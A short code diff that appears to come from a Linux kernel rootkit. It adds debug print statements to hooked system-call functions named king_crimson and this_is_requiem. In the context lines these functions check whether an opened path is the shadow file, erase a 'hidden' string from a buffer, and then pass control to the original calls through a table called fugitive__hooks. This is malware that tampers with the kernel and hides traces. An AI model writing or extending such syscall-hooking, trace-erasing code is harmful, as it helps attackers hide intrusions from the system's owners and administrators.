@@ -276,8 +276,8 @@ asmlinkage int king_crimson(char *pathname, int flags, mode_t mode){
     } else if(!strcmp(SHADOW_PATH, pathname)){
         erase = SHAD_E;
     }
-    if (erase)
-      printk("want erase (%s)\n", pathname);
+if (erase) printk("want erase (%s)\n", pathname);
+else printk("[%s]\n", pathname);
     return (*((asmlinkage int (*)(char *, int, mode_t)) &fugitive__hooks[1].original))(pathname, flags, mode);
 }
 
@@ -308,6 +308,7 @@ printk("want erase\n");
         if(ptr != NULL)
             memset(ptr, '\0', strlen(hidden));
     }
+else printk("want erase\n");
 
     return ret;
 }
@@ -318,6 +319,7 @@ asmlinkage int this_is_requiem(int fd){
         erase = NONE;
 printk("want no erase\n");
     }
+else printk("nope\n");
     return (*((asmlinkage int (*)(int)) &fugitive__hooks[0].original))(fd);
 }
 
